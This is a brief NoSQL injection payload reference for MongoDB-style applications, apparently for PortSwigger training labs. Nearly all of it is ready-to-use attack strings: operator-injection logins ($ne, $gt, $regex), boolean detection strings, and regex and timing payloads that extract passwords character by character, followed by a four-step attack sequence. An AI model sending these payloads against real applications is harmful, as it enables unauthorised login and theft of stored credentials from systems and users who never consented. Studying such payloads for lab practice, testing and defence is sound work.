# NoSQL Injection - Payload Reference

## Authentication Bypass

### MongoDB
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### Query Operator Injection
```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

## Detection Payloads

### Boolean-Based
```
' || 1==1//
' || '1'=='1
" || 1==1//
```

### Operator Injection (JSON)
```json
{"username": "admin' || 1==1//", "password": "x"}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Data Extraction

### Regex Extraction
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

### Timing-Based
```json
{"username": "admin", "password": {"$regex": "^a.*.*.*.*.*$"}}
```

## PortSwigger Lab Approach
1. Try `' || 1==1//` in login fields
2. Try `{"$gt":""}` operator injection
3. If JSON API: send `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
4. Extract data with regex-based blind injection
